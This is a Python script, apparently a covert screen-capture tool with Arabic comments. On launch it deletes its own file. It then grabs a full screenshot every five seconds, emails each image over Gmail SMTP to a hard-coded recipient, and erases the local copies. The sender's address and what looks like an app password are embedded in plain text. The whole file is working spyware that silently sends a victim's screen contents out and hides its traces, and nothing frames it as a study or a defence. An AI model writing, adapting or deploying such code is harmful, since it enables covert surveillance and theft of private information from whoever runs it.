import os
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import schedule
from PIL import ImageGrab
import sys

EMAIL_ADDRESS = 'mrfa0gh@gmail.com'
EMAIL_PASSWORD = 'ppuz vusx tnwm vbwv'
TO_EMAIL = 'faresmohammedghalwash@gmail.com'

def send_email(subject, body, attachment_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename={attachment_path}')
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
    except Exception as e:
        with open('error_log.txt', 'a') as log_file:
            log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error: {str(e)}\n")

def take_screenshot():
    try:
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        screenshot_path = f'screenshot_{timestamp}.png'
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        send_email('New Screenshot', 'Hi This is Dev by Ghalwash @Mrfa0gh', screenshot_path)
        
        # حذف الصورة بعد إرسالها
        if os.path.exists(screenshot_path):
            os.remove(screenshot_path)
    except Exception as e:
        with open('error_log.txt', 'a') as log_file:
            log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error: {str(e)}\n")

def delete_script():
    try:
        script_path = sys.argv[0]  # الحصول على مسار ملف السكربت
        if os.path.exists(script_path):
            os.remove(script_path)  # حذف السكربت نفسه
    except Exception as e:
        with open('error_log.txt', 'a') as log_file:
            log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error: {str(e)}\n")

# حذف السكربت بمجرد تشغيله
delete_script()

schedule.every(5).seconds.do(take_screenshot)

while True:
    schedule.run_pending()
    time.sleep(1)
